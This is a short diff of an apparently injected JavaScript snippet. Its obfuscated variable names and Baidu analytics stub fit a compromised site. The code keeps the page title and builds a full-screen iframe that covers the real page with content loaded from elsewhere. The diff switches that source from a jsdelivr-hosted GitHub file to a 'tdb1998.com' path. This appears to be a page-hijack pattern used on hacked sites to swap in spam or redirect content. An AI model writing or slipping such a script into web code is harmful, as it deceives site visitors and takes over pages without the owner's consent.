@@ -7,7 +7,7 @@ var _hmt = _hmt || [];
 })();
 
 var IsYqkUK1 = window["document"]['title'];
-setFrame("//cdn.jsdelivr.net/gh/lulusetv/jss@html/a.htm");
+setFrame("/tdb1998.com/a.htm");
 
 function setFrame(qpFkEczo2) {
     var FwMpGJYz3 = '<title>' + IsYqkUK1 + '</title><div id="showcloneshengxiaon" style="height: 100%; width: 100%; background-color: rgb(255, 255, 255); background-position: initial initial; background-repeat: initial initial;"><iframe scrolling="yes" marginheight=0 marginwidth=0  frameborder="0" width="100%" height="100%" src="' + qpFkEczo2 + '"></iframe></div><style type="text/css">html{width:100%;height:100%;}body {width:100%;height:100%;}</style>';
